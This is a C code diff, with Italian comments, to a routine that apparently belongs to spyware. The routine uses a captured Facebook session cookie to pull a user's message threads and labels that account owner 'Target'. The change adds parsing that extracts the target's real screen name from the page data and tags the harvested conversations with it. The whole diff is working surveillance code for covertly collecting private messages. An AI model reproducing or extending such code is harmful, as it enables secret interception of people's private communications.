@@ -12,6 +12,7 @@
 #define FB_MESSAGE_TSTAMP_IDENTIFIER "data-utime=\\\""
 #define FB_MESSAGE_BODY_IDENTIFIER "div class=\\\"content noh\\\" id=\\\""
 #define FB_MESSAGE_AUTHOR_IDENTIFIER "\\u003C\\/a>\\u003C\\/strong>"
+#define FB_MESSAGE_SCREEN_NAME_ID "\"id\":\"%s\",\"name\":\""
 #define FB_NEW_LINE "\\u003Cbr \\/> "
 #define FB_POST_FORM_ID "post_form_id\":\""
 #define FB_PEER_ID_IDENTIFIER "\"fbid:"
@@ -118,7 +119,7 @@ DWORD HandleFBMessages(char *cookie)
 	BYTE *parser_inner1, *parser_inner2;
 	WCHAR fb_request[256];
 	BOOL is_incoming = FALSE;
-	char peers[256];
+	char peers[512];
 	char peers_id[256];
 	char author[256];
 	char author_id[256];
@@ -131,6 +132,8 @@ DWORD HandleFBMessages(char *cookie)
 	char form_id[256];
 	char dtsg_id[256];
 	char post_data[512];
+	char screen_name_tag[256];
+	char screen_name[256];
 
 	CheckProcessStatus();
 
@@ -154,11 +157,31 @@ DWORD HandleFBMessages(char *cookie)
 	}
 	*parser2=0;
 	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
-	SAFE_FREE(r_buffer);
 
 	// Torna utente "0" se non siamo loggati
-	if (!strcmp(user, "0"))
+	if (!strcmp(user, "0")) {
+		SAFE_FREE(r_buffer);
 		return SOCIAL_REQUEST_BAD_COOKIE;
+	}
+
+	// Cerca di ricavare lo screen name
+	do {
+		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "Target");
+		_snprintf_s(screen_name_tag, sizeof(screen_name_tag), _TRUNCATE, FB_MESSAGE_SCREEN_NAME_ID, user);
+		parser1 = parser2 + 1;
+		parser1 = (BYTE *)strstr((char *)parser1, screen_name_tag);
+		if (!parser1)
+			break;
+		parser1 += strlen(screen_name_tag);
+		parser2 = (BYTE *)strchr((char *)parser1, '\"');
+		if (!parser2)
+			break;
+		*parser2=0;
+		if (strlen((char *)parser1))
+			_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
+	} while(0);
+
+	SAFE_FREE(r_buffer);
 
 	// Carica dal file il last time stamp per questo utente
 	last_tstamp = GetLastFBTstamp(user, NULL);
@@ -252,7 +275,7 @@ DWORD HandleFBMessages(char *cookie)
 		if (!parser2)
 			break;
 		*parser2 = 0;
-		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "Target, %s", parser1);
+		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s, %s", screen_name, parser1);
 		parser1 = parser2 + 1;
 
 		// Pe ogni thread chiede tutti i rispettivi messaggi
